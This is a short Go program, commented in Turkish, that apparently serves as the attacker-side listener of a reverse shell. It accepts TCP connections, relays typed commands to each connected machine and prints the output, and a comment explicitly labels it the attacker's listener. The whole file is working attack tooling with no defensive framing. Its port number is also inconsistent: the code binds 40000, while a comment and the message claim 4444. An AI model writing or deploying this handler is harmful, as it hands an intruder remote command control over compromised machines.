package main

import (
        "bufio"
        "fmt"
        "log"
        "net"
        "os"
)

func handleConnection(conn net.Conn) {
        defer conn.Close()
        fmt.Println("Bağlantı kabul edildi:", conn.RemoteAddr())
        reader := bufio.NewReader(os.Stdin)
        for {
                // Komutu kullanıcıdan al
                cmd, _ := reader.ReadString('\n')

                // Komutu karşı tarafa gönder
                _, err := conn.Write([]byte(cmd))
                if err != nil {
                        fmt.Println("Komut gönderilemedi:", err)
                        return
                }

                // Karşı taraftan gelen yanıtı oku
                reply := make([]byte, 1024)
                n, err := conn.Read(reply)
                if err != nil {
                        fmt.Println("Cevap okunamadı:", err)
                        return
                }
                fmt.Print(string(reply[:n]))
        }

}

func main() {
        // Saldırgan dinleyici olarak çalışıyor
        ln, err := net.Listen("tcp", ":40000") // 4444 portu dinleniyor
        if err != nil {
                log.Fatal("Dinleyici başlatılamadı:", err)
        }
        defer ln.Close()

        fmt.Println("Dinleyici başlatıldı, 4444 portunda bekleniyor...")

        for {
                // Bağlantıları kabul et
                conn, err := ln.Accept()
                if err != nil {
                        log.Println("Bağlantı kabul edilemedi:", err)
                        continue
                }
                go handleConnection(conn)
        }
}
